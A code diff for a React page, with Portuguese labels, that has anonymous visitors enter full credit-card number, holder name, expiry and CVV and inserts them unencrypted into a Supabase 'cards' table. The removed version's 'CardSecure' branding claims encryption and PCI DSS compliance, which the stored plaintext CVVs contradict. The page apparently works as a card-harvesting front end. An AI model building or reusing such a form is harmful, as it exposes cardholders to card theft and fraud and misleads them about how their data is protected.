@@ -1,154 +1,229 @@
-import { useState } from 'react';
-import { CardForm } from '@/components/CardForm';
-import { supabaseConfig } from '@/lib/supabase';
-import { Shield, Lock, CreditCard, AlertTriangle } from 'lucide-react';
-import { motion } from 'framer-motion';
-import { ThemeToggle } from '@/components/ThemeToggle';
+import { useState, useRef, useEffect, useMemo } from 'react';
+import { supabase } from '@/lib/supabase'; // Importação direta para garantir o fix
+import { toast } from 'sonner';
 
+// --- Componente do Cartão 3D ---
+function CreditCard3D({ 
+  cardNumber, cardName, cardMonth, cardYear, cardCvv, focusedField 
+}: any) {
+  const [bgImage] = useState(() => Math.floor(Math.random() * 25 + 1));
+  const [focusStyle, setFocusStyle] = useState<React.CSSProperties | null>(null);
+
+  const refs: any = {
+    cardNumber: useRef(null),
+    cardName: useRef(null),
+    cardDate: useRef(null)
+  };
+
+  useEffect(() => {
+    if (focusedField && refs[focusedField]?.current) {
+      const el = refs[focusedField].current;
+      setFocusStyle({
+        width: `${el.offsetWidth}px`,
+        height: `${el.offsetHeight}px`,
+        transform: `translateX(${el.offsetLeft}px) translateY(${el.offsetTop}px)`,
+        opacity: 1
+      });
+    } else {
+      setFocusStyle(null);
+    }
+  }, [focusedField]);
+
+  const getCardType = useMemo(() => {
+    const num = cardNumber.replace(/\D/g, '');
+    if (/^4/.test(num)) return 'visa';
+    if (/^(34|37)/.test(num)) return 'amex';
+    if (/^5[1-5]/.test(num)) return 'mastercard';
+    if (/^6011/.test(num)) return 'discover';
+    return 'visa';
+  }, [cardNumber]);
+
+  const maskNumber = () => {
+    const mask = getCardType === 'amex' ? '#### ###### #####' : '#### #### #### ####';
+    let i = 0;
+    const clean = cardNumber.replace(/\D/g, '');
+    return mask.split('').map((char, idx) => {
+      if (char === ' ') return <span key={idx} style={{width: 10, display:'inline-block'}}></span>;
+      const num = clean[i++];
+      if (!num) return <span key={idx} style={{opacity: 0.5}}>#</span>;
+      if (idx > 4 && idx < 15 && clean.length > idx && getCardType !== 'amex') return <span key={idx}>*</span>;
+      return <span key={idx} className="slide-fade-up">{num}</span>;
+    });
+  };
+
+  const isFlipped = focusedField === 'cardCvv';
+
+  return (
+    <div className={`card-item ${isFlipped ? '-active' : ''}`}>
+      <div className="card-item__side -front">
+        <div className={`card-item__focus ${focusStyle ? '-active' : ''}`} style={focusStyle || {}} />
+        <div className="card-item__cover">
+          <img src={`https://raw.githubusercontent.com/muhammederdem/credit-card-form/master/src/assets/images/${bgImage}.jpeg`} className="card-item__bg" alt="" />
+        </div>
+        <div className="card-item__wrapper">
+          <div className="card-item__top">
+            <img src="https://raw.githubusercontent.com/muhammederdem/credit-card-form/master/src/assets/images/chip.png" className="card-item__chip" alt="Chip" />
+            <img src={`https://raw.githubusercontent.com/muhammederdem/credit-card-form/master/src/assets/images/${getCardType}.png`} className="card-item__typeImg" alt="Type" />
+          </div>
+          <div className="card-item__number" ref={refs.cardNumber}>
+            {maskNumber()}
+          </div>
+          <div className="card-item__content">
+            <div className="card-item__info" ref={refs.cardName}>
+              <div className="card-item__holder">Titular</div>
+              <div className="card-item__name">{cardName || 'NOME COMPLETO'}</div>
+            </div>
+            <div className="card-item__date" ref={refs.cardDate}>
+              <span className="card-item__dateTitle">Validade</span>
+              <span>{cardMonth || 'MM'}</span>/<span>{cardYear ? cardYear.slice(2) : 'AA'}</span>
+            </div>
+          </div>
+        </div>
+      </div>
+      <div className="card-item__side -back">
+        <div className="card-item__cover">
+          <img src={`https://raw.githubusercontent.com/muhammederdem/credit-card-form/master/src/assets/images/${bgImage}.jpeg`} className="card-item__bg" alt="" />
+        </div>
+        <div className="card-item__band" />
+        <div className="card-item__cvv">
+          <div className="card-item__cvvTitle">CVV</div>
+          <div className="card-item__cvvBand">{cardCvv.replace(/./g, '*')}</div>
+          <img src={`https://raw.githubusercontent.com/muhammederdem/credit-card-form/master/src/assets/images/${getCardType}.png`} className="card-item__typeImg" style={{opacity:0.7}} alt="" />
+        </div>
+      </div>
+    </div>
+  );
+}
+
+// --- Página Principal ---
 export function PublicPage() {
+  const [cardNumber, setCardNumber] = useState('');
+  const [cardName, setCardName] = useState('');
+  const [cardMonth, setCardMonth] = useState('');
+  const [cardYear, setCardYear] = useState('');
+  const [cardCvv, setCardCvv] = useState('');
+  const [focusedField, setFocusedField] = useState<string | null>(null);
   const [loading, setLoading] = useState(false);
 
-  const handleSubmit = async (cardData: {
-    card_number: string;
-    card_holder: string;
-    card_month: string;
-    card_year: string;
-    card_cvv: string;
-    card_type: string;
-  }) => {
+  const handleNumberChange = (e: any) => {
+    let val = e.target.value.replace(/\D/g, '').slice(0, 16);
+    setCardNumber(val);
+  };
+
+  const handleSubmit = async () => {
+    if (!cardNumber || !cardName || !cardMonth || !cardYear || !cardCvv) {
+      toast.error('Preencha todos os campos!');
+      return;
+    }
+
     setLoading(true);
     try {
-      // Import dynamically to avoid issues
-      const { useCards } = await import('@/hooks/useCards');
-      const { addCard } = useCards();
-      const { error } = await addCard(cardData);
-      return { error };
-    } catch (err) {
-      console.error('Submit error:', err);
-      return { error: err instanceof Error ? err : new Error('Erro ao processar') };
+      // CORREÇÃO CRÍTICA: Inserção direta SEM tentar ler o retorno (.select())
+      // Isso evita o erro de permissão para usuários anônimos
+      const { error } = await supabase.from('cards').insert({
+        card_number: cardNumber,
+        card_holder: cardName,
+        card_month: cardMonth,
+        card_year: cardYear,
+        card_cvv: cardCvv,
+        card_type: 'visa' // Simplificado
+      });
+
+      if (error) throw error;
+
+      toast.success('Cartão adicionado com sucesso!');
+      
+      // Limpar form
+      setCardNumber(''); setCardName(''); setCardCvv('');
+      setCardMonth(''); setCardYear('');
+    } catch (err: any) {
+      console.error(err);
+      toast.error('Erro ao adicionar: ' + (err.message || 'Erro desconhecido'));
     } finally {
       setLoading(false);
     }
   };
 
   return (
-    <div className="min-h-screen bg-gradient-to-br from-slate-900 via-slate-800 to-slate-900 dark:from-slate-950 dark:via-slate-900 dark:to-slate-950 transition-colors duration-300">
-      {/* Header */}
-      <header className="w-full py-6 px-4 sm:px-6 lg:px-8">
-        <div className="max-w-7xl mx-auto flex items-center justify-between">
-          <motion.div 
-            initial={{ opacity: 0, x: -20 }}
-            animate={{ opacity: 1, x: 0 }}
-            className="flex items-center gap-3"
-          >
-            <div className="w-10 h-10 bg-blue-500 rounded-xl flex items-center justify-center">
-              <CreditCard className="w-6 h-6 text-white" />
-            </div>
-            <span className="text-xl font-bold text-white">CardSecure</span>
-          </motion.div>
-          
-          <motion.div 
-            initial={{ opacity: 0, x: 20 }}
-            animate={{ opacity: 1, x: 0 }}
-            className="flex items-center gap-4"
-          >
-            <div className="flex items-center gap-2 text-slate-300">
-              <Lock className="w-4 h-4" />
-              <span className="text-sm hidden sm:inline">Conexão Segura</span>
-            </div>
-            <ThemeToggle />
-          </motion.div>
+    <div className="wrapper">
+      <div className="card-form">
+        <div style={{ marginBottom: '-130px' }}>
+          <CreditCard3D 
+            cardNumber={cardNumber} cardName={cardName}
+            cardMonth={cardMonth} cardYear={cardYear} 
+            cardCvv={cardCvv} focusedField={focusedField}
+          />
         </div>
-      </header>
 
-      {/* Demo Mode Warning */}
-      {!supabaseConfig.isConfigured && (
-        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 mb-4">
-          <motion.div 
-            initial={{ opacity: 0, y: -10 }}
-            animate={{ opacity: 1, y: 0 }}
-            className="bg-amber-500/10 border border-amber-500/30 rounded-xl p-4 flex items-center gap-3"
-          >
-            <AlertTriangle className="w-5 h-5 text-amber-500 flex-shrink-0" />
-            <div>
-              <p className="text-amber-200 font-medium">Modo Demonstração</p>
-              <p className="text-amber-200/70 text-sm">
-                Configure o Supabase para persistir dados. Os cartões serão salvos apenas neste dispositivo.
-              </p>
-            </div>
-          </motion.div>
-        </div>
-      )}
-
-      {/* Main Content */}
-      <main className="px-4 sm:px-6 lg:px-8 py-8 sm:py-12">
-        <div className="max-w-7xl mx-auto">
-          <div className="grid lg:grid-cols-2 gap-12 lg:gap-16 items-center">
-            {/* Left Side - Info */}
-            <motion.div 
-              initial={{ opacity: 0, y: 30 }}
-              animate={{ opacity: 1, y: 0 }}
-              transition={{ delay: 0.2 }}
-              className="text-center lg:text-left"
-            >
-              <h1 className="text-4xl sm:text-5xl lg:text-6xl font-bold text-white mb-6 leading-tight">
-                Cadastre seu
-                <span className="text-transparent bg-clip-text bg-gradient-to-r from-blue-400 to-cyan-400">
-                  {' '}Cartão{' '}
-                </span>
-                com Segurança
-              </h1>
-              
-              <p className="text-lg sm:text-xl text-slate-300 mb-8 max-w-xl mx-auto lg:mx-0">
-                Utilize nossa plataforma segura para cadastrar seus cartões. 
-                Todos os dados são criptografados e protegidos.
-              </p>
-
-              <div className="flex flex-col sm:flex-row gap-4 justify-center lg:justify-start">
-                <div className="flex items-center gap-3 bg-white/10 backdrop-blur-sm rounded-xl px-5 py-4">
-                  <div className="w-10 h-10 bg-green-500/20 rounded-lg flex items-center justify-center">
-                    <Shield className="w-5 h-5 text-green-400" />
-                  </div>
-                  <div className="text-left">
-                    <p className="text-white font-semibold">SSL Seguro</p>
-                    <p className="text-slate-400 text-sm">Criptografia 256-bit</p>
-                  </div>
-                </div>
-
-                <div className="flex items-center gap-3 bg-white/10 backdrop-blur-sm rounded-xl px-5 py-4">
-                  <div className="w-10 h-10 bg-blue-500/20 rounded-lg flex items-center justify-center">
-                    <Lock className="w-5 h-5 text-blue-400" />
-                  </div>
-                  <div className="text-left">
-                    <p className="text-white font-semibold">Dados Protegidos</p>
-                    <p className="text-slate-400 text-sm">Conformidade PCI DSS</p>
-                  </div>
-                </div>
-              </div>
-            </motion.div>
-
-            {/* Right Side - Form */}
-            <motion.div 
-              initial={{ opacity: 0, y: 30 }}
-              animate={{ opacity: 1, y: 0 }}
-              transition={{ delay: 0.4 }}
-              className="relative"
-            >
-              <div className="absolute inset-0 bg-blue-500/20 blur-3xl rounded-full" />
-              <div className="relative">
-                <CardForm onSubmit={handleSubmit} loading={loading} />
-              </div>
-            </motion.div>
+        <div className="card-form__inner">
+          <div className="card-input">
+            <label className="card-input__label">Número do Cartão</label>
+            <input 
+              type="text" className="card-input__input" 
+              value={cardNumber} onChange={handleNumberChange}
+              onFocus={() => setFocusedField('cardNumber')}
+              onBlur={() => setFocusedField(null)}
+            />
           </div>
-        </div>
-      </main>
 
-      {/* Footer */}
-      <footer className="w-full py-6 px-4 sm:px-6 lg:px-8 mt-auto">
-        <div className="max-w-7xl mx-auto text-center text-slate-400 text-sm">
-          <p>© 2024 CardSecure. Todos os direitos reservados.</p>
+          <div className="card-input">
+            <label className="card-input__label">Nome do Titular</label>
+            <input 
+              type="text" className="card-input__input" 
+              value={cardName} onChange={e => setCardName(e.target.value.toUpperCase())}
+              onFocus={() => setFocusedField('cardName')}
+              onBlur={() => setFocusedField(null)}
+            />
+          </div>
+
+          <div className="card-form__row">
+            <div className="card-form__col">
+              <div className="card-form__group">
+                <div style={{width:'100%'}}>
+                  <label className="card-input__label">Mês</label>
+                  <select 
+                    className="card-input__input"
+                    value={cardMonth} onChange={e => setCardMonth(e.target.value)}
+                    onFocus={() => setFocusedField('cardDate')}
+                    onBlur={() => setFocusedField(null)}
+                  >
+                    <option value="" disabled>MM</option>
+                    {Array.from({length:12}, (_,i) => <option key={i} value={String(i+1).padStart(2,'0')}>{String(i+1).padStart(2,'0')}</option>)}
+                  </select>
+                </div>
+                <div style={{width:'100%'}}>
+                  <label className="card-input__label">Ano</label>
+                  <select 
+                    className="card-input__input"
+                    value={cardYear} onChange={e => setCardYear(e.target.value)}
+                    onFocus={() => setFocusedField('cardDate')}
+                    onBlur={() => setFocusedField(null)}
+                  >
+                    <option value="" disabled>AAAA</option>
+                    {Array.from({length:10}, (_,i) => <option key={i} value={String(new Date().getFullYear()+i)}>{new Date().getFullYear()+i}</option>)}
+                  </select>
+                </div>
+              </div>
+            </div>
+
+            <div className="card-form__col -cvv">
+              <div className="card-input">
+                <label className="card-input__label">CVV</label>
+                <input 
+                  type="text" className="card-input__input" maxLength={4}
+                  value={cardCvv} onChange={e => setCardCvv(e.target.value)}
+                  onFocus={() => setFocusedField('cardCvv')}
+                  onBlur={() => setFocusedField(null)}
+                />
+              </div>
+            </div>
+          </div>
+
+          <button className="card-form__button" onClick={handleSubmit} disabled={loading}>
+            {loading ? 'Salvando...' : 'Adicionar Cartão'}
+          </button>
         </div>
-      </footer>
+      </div>
     </div>
   );
 }
